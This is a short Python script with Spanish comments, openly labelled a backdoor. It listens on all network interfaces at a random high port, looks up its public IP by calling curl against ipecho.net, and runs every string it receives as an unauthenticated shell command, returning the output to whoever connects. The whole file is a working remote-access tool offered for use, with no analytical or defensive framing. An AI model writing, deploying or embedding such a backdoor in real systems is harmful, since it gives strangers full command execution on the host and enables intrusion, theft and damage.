import socket
import subprocess
import random

# Definir el rango de puertos
min_port = 49152
max_port = 65535


# Asignar un puerto aleatorio dentro del rango especificado
def get_random_port():
    return random.randint(min_port, max_port)


def get_public_ip():
    import re

    ip = (
        subprocess.check_output("curl -s4 ipecho.net/plain", shell=True)
        .decode()
        .strip()
    )
    return re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip).group()


def execute_command(command):
    return subprocess.check_output(command, shell=True)


public_ip = "0.0.0.0"
port = get_random_port()


def backdoor():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server.bind((public_ip, port))
    server.listen(1)
    print(f"Backdoor listening on {public_ip}:{port}...")
    print(
        f"{public_ip} significa escucha en todas las interfaces.\n "
        f"De esta manera, el servidor aceptará conexiones desde cualquier dirección IP, incluyendo la dirección IP pública.\n"
    )
    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr}")
        print(f"Type 'exit' to exit the backdoor.")
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                client_socket.close()
                print("bye!")
                break
            else:
                output = execute_command(command)
                client_socket.send(output)


if __name__ == "__main__":
    print(f"La ip pública parece ser {get_public_ip()}\n Intentando en el port: {port}")
    backdoor()
